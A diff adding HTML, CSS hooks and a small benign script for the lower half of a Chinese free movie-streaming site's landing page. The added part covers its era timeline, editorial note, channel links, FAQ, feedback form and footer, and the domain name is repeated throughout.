+      <div class="pg h"><div class="cv" style="background:linear-gradient(160deg,#5c7c8a,#2e4250);"></div><div class="sh"></div><div class="mk"><span class="tp">2020s</span></div><div class="ft"><b>流媒体时代</b><div class="sb"><span>剧集 / 限定剧 · 3,760 部</span><span>3,760</span></div></div></div>
+      <div class="pg h"><div class="cv" style="background:linear-gradient(160deg,#c4511e,#5c2418);"></div><div class="mk"><span class="tp">2026</span><span class="pl">▶</span></div><div class="sh"></div><div class="ft"><b>本年度新片</b><div class="sb"><span>院线热映 · 468 部</span><span>上新</span></div></div></div>
+      <div class="pg h"><div class="cv" style="background:linear-gradient(160deg,#d8cfc0,#a89d8a);"></div><div class="sh"></div><div class="mk"><span class="tp" style="background:var(--ink);">修复计划</span></div><div class="ft" style="color:var(--ink);"><b>经典修复计划</b><div class="sb" style="color:var(--ink3);"><span>4K 修复 · 1,040 部</span><span>修复</span></div></div></div>
+    </div>
+    <div class="tl rv" style="margin-top:56px;">
+      <div class="tm">
+        <div class="it"><div class="d">1993 — 2002</div><b>港片黄金年代</b><p>周星驰、王家卫、杜琪峰……一个再也回不去的香港电影黄金十年，喜剧、黑帮、武侠百花齐放。</p></div>
+        <div class="it"><div class="d">2003 — 2012</div><b>华语新浪潮</b><p>贾樟柯、王小帅、娄烨等第六代导演走向国际，独立电影与艺术院线开始被看见。</p></div>
+        <div class="it"><div class="d">2013 — 2019</div><b>类型片成熟</b><p>国产科幻、犯罪、悬疑全面崛起，《流浪地球》《误杀》等类型片打开新局面。</p></div>
+      </div>
+      <div class="tm">
+        <div class="it"><div class="d">2020 — 2023</div><b>流媒体与剧集时代</b><p>剧集质量全面对标电影，限定剧、短剧集成为新主流，追剧习惯彻底改变。</p></div>
+        <div class="it"><div class="d">2024 — 2026</div><b>多元与小众崛起</b><p>艺术电影、纪录片、国漫剧场版获得更多关注，观众口味越来越多元细分。</p></div>
+        <div class="it"><div class="d">持续进行</div><b>经典 4K 修复计划</b><p>每年修复 200+ 部经典老片，让黑白胶片时代的影像在 4K 屏幕上重新清晰。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 编辑手记 -->
+<section id="ed" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="kicker rv"><span class="no">04 / EDITORIAL</span><h2>编辑手记 · 关于本站<span class="jp">About</span></h2><span class="ln"></span></div>
+    <div class="ed rv">
+      <div class="cv">
+        <div class="no">EDITOR'S NOTE 01</div>
+        <h3>我们不做数量的喧嚣，<br>只做<em>精选</em>的安静。</h3>
+        <p>飘零电影网(piaolingdianyingwang-wap.github.io)由一群爱看片的人维护。我们见过太多影视站堆满广告、弹窗和无关推荐，于是想做一处清简的地方：打开就能看，看完不被打扰。</p>
+      </div>
+      <div class="bd">
+        <div class="blk"><span class="n">A</span><div><b>为什么叫飘零？</b><span>每一部好片都像一片飘零的落叶，安静落下，却值得被捡起来好好看一眼。</span></div></div>
+        <div class="blk"><span class="n">B</span><div><b>怎么选片？</b><span>编辑团队每周筛选新片，评分、口碑、艺术价值三重标准，入选后才会出现在首页。</span></div></div>
+        <div class="blk"><span class="n">C</span><div><b>收费吗？</b><span>完全免费。所有精选影视资源均可免费在线观看，无需注册登录或付费订阅。</span></div></div>
+        <div class="blk"><span class="n">D</span><div><b>支持哪些设备？</b><span>手机、平板、电脑全兼容，页面自动适配屏幕尺寸，横竖屏自由切换。</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 频道入口 -->
+<section id="ch">
+  <div class="wrap">
+    <div class="kicker rv"><span class="no">05 / CHANNELS</span><h2>频道入口<span class="jp">Channels</span></h2><span class="ln"></span></div>
+    <p class="lead rv">五大频道，一屏直达。</p>
+    <div class="grid g4 rv">
+      <div class="pg f"><div class="cv" style="background:linear-gradient(160deg,#c4511e,#5c2418);"></div><div class="sh"></div><div class="mk"><span class="tp">电影</span></div><div class="ft"><b>电影频道</b><div class="sb"><span>12,800+ 部</span><span>进入 →</span></div></div></div>
+      <div class="pg f"><div class="cv" style="background:linear-gradient(160deg,#5c7c8a,#2e4250);"></div><div class="sh"></div><div class="mk"><span class="tp">电视剧</span></div><div class="ft"><b>电视剧频道</b><div class="sb"><span>7,640+ 部</span><span>进入 →</span></div></div></div>
+      <div class="pg f"><div class="cv" style="background:linear-gradient(160deg,#7a8f6a,#3f5237);"></div><div class="sh"></div><div class="mk"><span class="tp">动漫</span></div><div class="ft"><b>动漫频道</b><div class="sb"><span>5,210+ 部</span><span>进入 →</span></div></div></div>
+      <div class="pg f"><div class="cv" style="background:linear-gradient(160deg,#9a7b4f,#4a3820);"></div><div class="sh"></div><div class="mk"><span class="tp">纪录片</span></div><div class="ft"><b>纪录片</b><div class="sb"><span>2,870+ 部</span><span>进入 →</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="kicker rv"><span class="no">06 / FAQ</span><h2>常见问题与意见反馈<span class="jp">FAQ</span></h2><span class="ln"></span></div>
+    <div class="faq rv">
+      <div class="qa">
+        <div class="it open">
+          <div class="q" data-n="01"><span>飘零电影网是免费的吗？</span><span class="ic">＋</span></div>
+          <div class="a"><div><span>是的。飘零电影网(piaolingdianyingwang-wap.github.io)提供完全免费的在线观影服务，所有精选影视资源均可免费播放，无需注册登录或付费订阅。</span></div></div>
+        </div>
+        <div class="it">
+          <div class="q" data-n="02"><span>官网地址是什么？</span><span class="ic">＋</span></div>
+          <div class="a"><div><span>飘零电影网官网地址为 piaolingdianyingwang-wap.github.io，建议收藏该网址，方便随时访问最新精选选片与年代影库。</span></div></div>
+        </div>
+        <div class="it">
+          <div class="q" data-n="03"><span>播放卡顿怎么办？</span><span class="ic">＋</span></div>
+          <div class="a"><div><span>播放页支持多线路切换，遇到卡顿可点击"换线"按钮切换备用线路；同时建议确保网络稳定，高清内容在 Wi-Fi 环境下观看更流畅。</span></div></div>
+        </div>
+        <div class="it">
+          <div class="q" data-n="04"><span>支持手机和平板访问吗？</span><span class="ic">＋</span></div>
+          <div class="a"><div><span>完全支持。本站采用响应式设计，页面会根据手机、平板、电脑的屏幕尺寸自动适配排版，播放器支持横竖屏切换。</span></div></div>
+        </div>
+        <div class="it">
+          <div class="q" data-n="05"><span>想看某部影片但找不到怎么办？</span><span class="ic">＋</span></div>
+          <div class="a"><div><span>可通过顶部检索框按片名、导演、演员搜索，也可使用分类导航按题材、地区、年代、评分筛选；若仍找不到，可通过右侧意见反馈提交需求。</span></div></div>
+        </div>
+        <div class="it">
+          <div class="q" data-n="06"><span>可以投屏到电视上看吗？</span><span class="ic">＋</span></div>
+          <div class="a"><div><span>可以。手机端播放页支持一键投屏到智能电视或电视盒子，大屏观影体验更佳。</span></div></div>
+        </div>
+      </div>
+      <div class="note">
+        <span class="pin">LETTER</span>
+        <div class="no">LETTER 02</div>
+        <h4>想看什么片？<em>写给我们。</em></h4>
+        <p class="sb">找不到的影片、播放问题、选片建议，欢迎留言。我们会认真读每一封信。</p>
+        <div class="rw"><input type="text" placeholder="你的称呼（选填）"></div>
+        <div class="rw"><input type="text" placeholder="片名 / 问题描述"></div>
+        <div class="rw"><textarea placeholder="详细内容，如：希望收录的影片名称、播放异常描述等"></textarea></div>
+        <button type="button">寄出这封信</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="lo">
+        <b>飘零电影网</b>
+        <div class="do">piaolingdianyingwang-wap.github.io</div>
+        <p>飘零电影网(piaolingdianyingwang-wap.github.io) — 清简克制的在线观影平台，精选电影、电视剧、动漫、纪录片与艺术电影，界面清简，播放无干扰。</p>
+      </div>
+      <div>
+        <h5>找片</h5>
+        <ul>
+          <li><a href="#sel">精选选片</a></li>
+          <li><a href="#cat">分类导航</a></li>
+          <li><a href="#timeline">年代影库</a></li>
+          <li><a href="#">电影频道</a></li>
+          <li><a href="#">电视剧频道</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>频道</h5>
+        <ul>
+          <li><a href="#">动漫</a></li>
+          <li><a href="#">纪录片</a></li>
+          <li><a href="#">综艺</a></li>
+          <li><a href="#">艺术电影</a></li>
+          <li><a href="#">经典修复</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于</h5>
+        <ul>
+          <li><a href="#ed">编辑手记</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#faq">意见反馈</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">联系我们</a></li>
+        </ul>
+        <h5 style="margin-top:26px;">站内标签</h5>
+        <div class="tg">
+          <a href="#">在线观影</a><a href="#">电影在线观看</a><a href="#">精选影视</a><a href="#">艺术电影</a><a href="#">纪录片</a><a href="#">电视剧</a><a href="#">动漫</a><a href="#">经典修复</a>
+        </div>
+      </div>
+    </div>
+    <div class="col">
+      <div><b>精选选片</b> · 每日人工筛选，不做无差别堆量</div>
+      <div><b>分类导航</b> · 五大频道 42 个细分类型</div>
+      <div><b>年代影库</b> · 1990 年代至今的影史脉络</div>
+      <div><b>经典修复</b> · 4K 修复计划每年 200+ 部</div>
+      <div><b>多端适配</b> · 手机 / 平板 / 电脑 / 电视投屏</div>
+      <div><b>完全免费</b> · 无需注册登录或付费订阅</div>
+    </div>
+    <div class="bottom">
+      <p>© 2026 <a href="https://piaolingdianyingwang-wap.github.io">飘零电影网(piaolingdianyingwang-wap.github.io)</a> 版权所有 · 一隅清简，为懂片的人留一处安静。</p>
+      <p style="margin-top:8px;">本站仅供影视资源信息展示与导航，请支持正版内容。 ｜ ICP备案号：示例备 2026000007 号</p>
+    </div>
+  </div>
+</footer>
+
+<button id="gotop" aria-label="回到顶部">↑</button>
+
+<script>
+var topBtn=document.getElementById('gotop');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY>460;topBtn.classList.toggle('show',y);
+  var pos=window.scrollY+140,idx=0;
+  document.querySelectorAll('.nav a').forEach(function(a){
+    var el=document.querySelector(a.getAttribute('href'));
+    if(el&&el.offsetTop<=pos)idx=Array.prototype.indexOf.call(document.querySelectorAll('.nav a'),a);
+  });
+  document.querySelectorAll('.nav a').forEach(function(a){a.classList.remove('on');});
+  var cur=document.querySelectorAll('.nav a')[idx];
+  if(cur)cur.classList.add('on');
+});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+document.getElementById('ham').addEventListener('click',function(){
+  this.classList.toggle('on');
+  var n=document.getElementById('nav');
+  if(n.style.display==='flex'){n.style.display='';}
+  else{n.style.display='flex';n.style.position='absolute';n.style.top='64px';n.style.left='0';n.style.right='0';n.style.background='rgba(244,241,234,.98)';n.style.flexDirection='column';n.style.padding='12px 18px';n.style.borderBottom='1px solid var(--line)';}
+});
+document.querySelectorAll('.cap').forEach(function(t){
+  t.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){t.querySelectorAll('a').forEach(function(x){x.classList.remove('on');});e.target.classList.add('on');}
+  });
+});
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e){
+    if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}
+  });
+},{threshold:.12,rootMargin:'0px 0px -40px'});
+document.querySelectorAll('.rv').forEach(function(el){io.observe(el);});
+document.querySelectorAll('.qa .it').forEach(function(it){
+  it.querySelector('.q').addEventListener('click',function(){
+    var open=it.classList.contains('open');
+    document.querySelectorAll('.qa .it').forEach(function(x){x.classList.remove('open');});
+    if(!open)it.classList.add('open');
+  });
+});
+document.querySelector('.note button').addEventListener('click',function(){
+  var t=this;if(t.disabled)return;
+  var o=t.textContent;t.disabled=true;t.textContent='寄送中…';
+  setTimeout(function(){t.textContent='已收到，谢谢你。';setTimeout(function(){t.disabled=false;t.textContent=o;},2800);},900);
+});
+</script>
+</body>
+</html>
